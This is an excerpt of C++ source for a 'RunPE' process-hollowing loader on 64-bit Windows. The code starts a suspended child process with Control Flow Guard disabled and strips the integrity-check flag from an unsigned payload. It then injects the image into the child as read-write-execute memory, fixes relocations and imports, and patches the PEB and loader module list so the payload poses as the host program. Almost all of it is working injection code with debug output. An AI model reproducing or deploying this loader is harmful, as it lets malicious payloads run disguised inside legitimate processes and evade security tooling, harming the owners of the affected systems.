...
typedef NTSTATUS(NTAPI *fnNtUnmapViewOfSection)(HANDLE ProcessHandle,
                                                PVOID BaseAddress);
...
// Needed because localBuffer holds the raw on-disk PE, not a memory-mapped
// image.
static DWORD RvaToOffset(PIMAGE_NT_HEADERS64 pNtHeaders, DWORD rva) {
  ...
  for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
    ...
    DWORD vsz = pSec[i].Misc.VirtualSize ? pSec[i].Misc.VirtualSize
...
static bool ApplyRelocations(HANDLE hProcess, LPVOID pRemoteImage,
                             const uint8_t *localBuffer,
                             PIMAGE_NT_HEADERS64 pNtHeaders, ULONGLONG delta) {
  if (delta == 0)
  ...
  while (processed < relocSize) {
    ...
    for (DWORD i = 0; i < entryCount; i++) {
      ...
      if (type == IMAGE_REL_BASED_DIR64) {
        ...
        ULONGLONG patchAddr =
            (ULONGLONG)pRemoteImage + block->VirtualAddress + offset;
        ULONGLONG originalValue = 0;

        if (!ReadProcessMemory(hProcess, (LPCVOID)patchAddr, &originalValue,
                               sizeof(ULONGLONG), NULL)) {
          std::cout << "[-] Failed to read reloc at RVA 0x" << std::hex
                    << (block->VirtualAddress + offset) << std::dec << "\n";
          return false;
        }

        originalValue += delta;

        if (!WriteProcessMemory(hProcess, (LPVOID)patchAddr, &originalValue,
                                sizeof(ULONGLONG), NULL)) {
          std::cout << "[-] Failed to write reloc at RVA 0x" << std::hex
                    << (block->VirtualAddress + offset) << std::dec << "\n";
          return false;
        }
        ...
        ReadProcessMemory(hProcess, (LPCVOID)patchAddr, &originalValue,
                          sizeof(DWORD), NULL);
        originalValue += (DWORD)delta;
        WriteProcessMemory(hProcess, (LPVOID)patchAddr, &originalValue,
                           sizeof(DWORD), NULL);
      }
...
// because CREATE_SUSPENDED only suspends the initial thread; ntdll/heap are
// ready.
...
static bool ResolveImports(HANDLE hProcess, LPVOID pRemoteImage,
                           const uint8_t *localBuffer,
  ...
  while (pImportDesc->Name != 0) {
    ...
    // Use OriginalFirstThunk (INT) for name lookup, FirstThunk (IAT) for
    // patching
    DWORD intRva = pImportDesc->OriginalFirstThunk
    ...
    for (DWORD i = 0; pINT[i].u1.AddressOfData != 0; i++) {
      ...
      if (IMAGE_SNAP_BY_ORDINAL64(pINT[i].u1.Ordinal)) {
        ...
        if (!funcAddr) {
          std::cout << "[-] IAT: failed to resolve ordinal " << ordinal
                    << " from " << dllName << "\n";
          return false;
        }
      } else {
        DWORD ibnOffset =
            RvaToOffset(pNtHeaders, (DWORD)pINT[i].u1.AddressOfData);
        if (ibnOffset == 0) {
        ...
        if (!funcAddr) {
          std::cout << "[-] IAT: failed to resolve " << pIBN->Name << " from "
                    << dllName << "\n";
          return false;
        }
      }
      ...
      ULONGLONG patchAddr =
          (ULONGLONG)pRemoteImage + iatRVA + i * sizeof(ULONGLONG);
      ULONGLONG addrValue = (ULONGLONG)funcAddr;
      if (!WriteProcessMemory(hProcess, (LPVOID)patchAddr, &addrValue,
                              sizeof(ULONGLONG), NULL)) {
        std::cout << "[-] IAT: WriteProcessMemory failed for IAT entry " << i
                  << " in " << dllName << "\n";
        return false;
      }
    }
...
bool Execute(const std::vector<uint8_t> &memoryBuffer, size_t allocationSize,
  ...
  // Create suspended child process with mitigations disabled (CFG causes
  // 0xc0000142 in hollowed processes)
  ...
  // Disable CFG and dynamic code restrictions using SDK constants to avoid
  // bit-shift mistakes. CFG causes STATUS_DLL_INIT_FAILED (0xc0000142) in
  // hollowed processes if not disabled.
  DWORD64 policy = 0;
  policy |=
      PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF; // 0x0000000200000000
  policy |=
  ...
  NTSTATUS status = NtQueryInformationProcess(
      pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
  if (status != 0) {
    std::cout << "[-] NtQueryInformationProcess failed (0x" << std::hex
              << status << std::dec << ")\n";
...
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
  ...
  std::cout << "[RunPE] PEB base from NtQueryInformationProcess: 0x" << std::hex
            << (ULONGLONG)pbi.PebBaseAddress << std::dec << "\n";
  ...
  if ((ULONGLONG)pbi.PebBaseAddress == 0 ||
    ...
    std::cout << "[RunPE] Warning: PEB address seems invalid (0x" << std::hex
              << (ULONGLONG)pbi.PebBaseAddress << ").\n";
    std::cout << "[RunPE] Trying alternative method via TEB...\n";

    // Try to get PEB via TEB - on x64, TEB is in GS segment
    // For a suspended process, we can try to read the TEB from the thread's
    // context
    CONTEXT ctx = {};
    ...
    if (GetThreadContext(pi.hThread, &ctx)) {
      ...
      std::cout
          << "[RunPE] Thread context obtained, but TEB access is complex\n";
      std::cout << "[RunPE] Will proceed with current PEB address despite "
                   "suspicion\n";
    } else {
  ...
  if ((ULONGLONG)pbi.PebBaseAddress == 0 ||
      (ULONGLONG)pbi.PebBaseAddress > 0x7FFFFFFFFFFF) {
    std::cout << "[RunPE] ERROR: Still have invalid PEB address. Process may "
                 "not be properly initialized.\n";
    std::cout << "[RunPE] This is likely why LDR is NULL and exception "
                 "handling fails.\n";
  ...
  SIZE_T bytesRead = 0;
  if (!ReadProcessMemory(pi.hProcess, pebImageBaseAddr, &originalImageBase,
                         sizeof(ULONGLONG), &bytesRead)) {
    std::cout << "[-] Failed to read ImageBaseAddress from PEB. Error: "
              << GetLastError() << "\n";
    std::cout << "[RunPE] PEB may not be properly initialized. Trying to "
                 "continue...\n";
    ...
    if (ReadProcessMemory(pi.hProcess, (LPCVOID)0x140000000, hostHeaders.data(),
                          4096, &bytesRead)) {
      PIMAGE_DOS_HEADER pHostDos = (PIMAGE_DOS_HEADER)hostHeaders.data();
      if (pHostDos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS64 pHostNt =
            (PIMAGE_NT_HEADERS64)(hostHeaders.data() + pHostDos->e_lfanew);
        if (pHostNt->Signature == IMAGE_NT_SIGNATURE) {
          originalImageBase = pHostNt->OptionalHeader.ImageBase;
          std::cout << "[RunPE] Got original image base from PE headers: 0x"
                    << std::hex << originalImageBase << std::dec << "\n";
        }
      }
    }
    if (originalImageBase == 0) {
      originalImageBase = 0x140000000; // Default guess for 64-bit host
      std::cout << "[RunPE] Using default image base: 0x" << std::hex
                << originalImageBase << std::dec << "\n";
    }
  } else {
    std::cout << "[RunPE] Original image base from PEB: 0x" << std::hex
              << originalImageBase << std::dec << "\n";
  }

  // Unmap the original image from the child process
  // We leave it mapped so LdrInitializeThunk can initialize the process
  // successfully NtUnmapViewOfSection(pi.hProcess, (PVOID)originalImageBase);
  ...
  // Ensure we allocate enough memory to hold the trampoline at the host's entry
  // point
  PIMAGE_DOS_HEADER pMyDosHdr = (PIMAGE_DOS_HEADER)GetModuleHandleA(NULL);
  PIMAGE_NT_HEADERS64 pMyNtHdr =
      (PIMAGE_NT_HEADERS64)((BYTE *)pMyDosHdr + pMyDosHdr->e_lfanew);
  ...
  LPVOID pRemoteImage =
      VirtualAllocEx(pi.hProcess, (LPVOID)preferredBase, finalSize,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  bool needsRelocation = false;
  if (!pRemoteImage) {
    std::cout << "[*] Preferred base 0x" << std::hex << preferredBase
              << std::dec << " unavailable, rebasing...\n";
    pRemoteImage =
        VirtualAllocEx(pi.hProcess, NULL, finalSize, MEM_COMMIT | MEM_RESERVE,
  ...
  auto *pNtHdrPatch =
      (PIMAGE_NT_HEADERS64)(headersBuf.data() + pDosHeader->e_lfanew);
  // FORCE_INTEGRITY (0x0080): requires image to be signed — our payload is not
  pNtHdrPatch->OptionalHeader.DllCharacteristics &=
      ~IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY;
  // GUARD_CF (0x4000): CFG flag conflicts with CONTROL_FLOW_GUARD_ALWAYS_OFF
  // process policy
  pNtHdrPatch->OptionalHeader.DllCharacteristics &=
  ...
  if (!WriteProcessMemory(pi.hProcess, pRemoteImage, headersBuf.data(),
  ...
  if (needsRelocation) {
    ...
    std::cout << "[RunPE] Applying relocations (delta: 0x" << std::hex << delta
              << std::dec << ")\n";

    if (!ApplyRelocations(pi.hProcess, pRemoteImage, memoryBuffer.data(),
                          pNtHeaders, delta)) {
  ...
  // This will trigger EnsureDllInChild -> CreateRemoteThread ->
  // LdrInitializeThunk. Because the original image is still mapped and
  // PEB->ImageBaseAddress points to it, LdrInitializeThunk will successfully
  // initialize the process and create the LDR!
  if (!ResolveImports(pi.hProcess, pRemoteImage, memoryBuffer.data(),
                      pNtHeaders)) {
  ...
  if (!WriteProcessMemory(pi.hProcess, pebImageBaseAddr, &newBase,
                          sizeof(ULONGLONG), NULL)) {
  ...
  // -----------------------------------------------------------------------
  {
    ...
    ULONGLONG ldrPtr = 0;
    ReadProcessMemory(pi.hProcess, (LPCVOID)pLdrAddr, &ldrPtr,
                      sizeof(ULONGLONG), NULL);

    // PEB_LDR_DATA->InLoadOrderModuleList.Flink is at offset 0x10
    ULONGLONG listHead = ldrPtr + 0x10; // &InLoadOrderModuleList
    ULONGLONG flink = 0;
    ReadProcessMemory(pi.hProcess, (LPCVOID)listHead, &flink, sizeof(ULONGLONG),
                      NULL);

    // Debug output
    std::cout << "[RunPE] Debug: PEB @ 0x" << std::hex << pebBase << std::dec
              << "\n";
    std::cout << "[RunPE] Debug: LDR pointer = 0x" << std::hex << ldrPtr
              << std::dec << "\n";
    if (ldrPtr == 0) {
      std::cout
          << "[RunPE] Debug: LDR pointer is NULL - PEB may be corrupted\n";
      ...
      if (rtlInitAddr) {
        ...
        if (pScMem) {
          ...
          ReadProcessMemory(pi.hProcess, (LPCVOID)pLdrAddr, &ldrPtr,
                            sizeof(ULONGLONG), NULL);
          std::cout << "[RunPE] Debug: New LDR pointer = 0x" << std::hex
                    << ldrPtr << std::dec << "\n";

          if (ldrPtr != 0) {
            listHead = ldrPtr + 0x10;
            ReadProcessMemory(pi.hProcess, (LPCVOID)listHead, &flink,
                              sizeof(ULONGLONG), NULL);
          }
        }
      }
    }
    std::cout << "[RunPE] Debug: List head = 0x" << std::hex << listHead
              << std::dec << "\n";
    std::cout << "[RunPE] Debug: First Flink = 0x" << std::hex << flink
              << std::dec << "\n";
    std::cout << "[RunPE] Debug: Searching for originalImageBase = 0x"
              << std::hex << originalImageBase << std::dec << "\n";
    std::cout << "[RunPE] Debug: pRemoteImage = 0x" << std::hex
              << (ULONGLONG)pRemoteImage << std::dec << "\n";
    ...
    for (int i = 0; i < 512 && entry != 0 && entry != listHead; i++) {
      ULONGLONG dllBase = 0;
      ReadProcessMemory(pi.hProcess, (LPCVOID)(entry + 0x30), &dllBase,
                        sizeof(ULONGLONG), NULL);

      // Debug: print each entry
      std::cout << "[RunPE] LDR entry " << i << ": dllBase=0x" << std::hex
                << dllBase << " (looking for 0x" << originalImageBase << ")"
                << std::dec << std::endl;
      ...
      if (dllBase == originalImageBase) {
        // Redirect DllBase to our new allocation so range checks hit the
        // payload
        ULONGLONG newDllBase = (ULONGLONG)pRemoteImage;
        WriteProcessMemory(pi.hProcess, (LPVOID)(entry + 0x30), &newDllBase,
                           sizeof(ULONGLONG), NULL);
        // Update SizeOfImage to cover the full payload
        ULONG newSizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
        WriteProcessMemory(pi.hProcess, (LPVOID)(entry + 0x40), &newSizeOfImage,
                           sizeof(ULONG), NULL);
        // Also update EntryPoint (offset 0x38)
        ULONGLONG newEP = (ULONGLONG)pRemoteImage +
                          pNtHeaders->OptionalHeader.AddressOfEntryPoint;
        WriteProcessMemory(pi.hProcess, (LPVOID)(entry + 0x38), &newEP,
                           sizeof(ULONGLONG), NULL);
        std::cout << "[RunPE] Patched LDR entry (base: 0x" << std::hex
                  << originalImageBase << " -> 0x" << newDllBase
                  << ", SizeOfImage: 0x" << newSizeOfImage << std::dec << ")\n";
        patchedLdr = true;
        break;
      }
      ...
      ReadProcessMemory(pi.hProcess, (LPCVOID)entry, &nextFlink,
                        sizeof(ULONGLONG), NULL);
      entry = nextFlink;
    }
    if (!patchedLdr)
  ...
  // -----------------------------------------------------------------------
  {
    DWORD exRVA = pNtHeaders->OptionalHeader
                      .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]
                      .VirtualAddress;
    DWORD exSize = pNtHeaders->OptionalHeader
                       .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]
                       .Size;
      ...
      if (pScMem) {
        ...
        HANDLE hSc =
            CreateRemoteThread(pi.hProcess, NULL, 0,
                               (LPTHREAD_START_ROUTINE)pScMem, NULL, 0, NULL);
        if (hSc) {
          WaitForSingleObject(hSc, 5000);
          CloseHandle(hSc);
        }
        VirtualFreeEx(pi.hProcess, pScMem, 0, MEM_RELEASE);
        std::cout << "[RunPE] Registered exception table (" << entries
                  << " entries)\n";
      }
    }
  }
  ...
  // We do NOT modify Rip, so ntdll!RtlUserThreadStart can run
  // LdrInitializeThunk.
  ULONGLONG newEntry =
      (ULONGLONG)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
  {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(pi.hThread, &ctx)) {
  ...
  std::cout << "[RunPE] Successfully mapped. Entry: 0x" << std::hex << newEntry
  ...
  if (waitResult == WAIT_OBJECT_0) {
    ...
    if (exitCode == 0xC0000142)
      std::cout << "[-] STATUS_DLL_INIT_FAILED — a DLL's DllMain returned "
                   "FALSE or a required DLL failed to load\n";
    else if (exitCode == 0xC0000005)
      std::cout << "[-] STATUS_ACCESS_VIOLATION — relocation or memory "
                   "protection issue\n";
    else if (exitCode == 0xC0000135)
      std::cout << "[-] STATUS_DLL_NOT_FOUND — target imports a DLL that is "
                   "not installed\n";
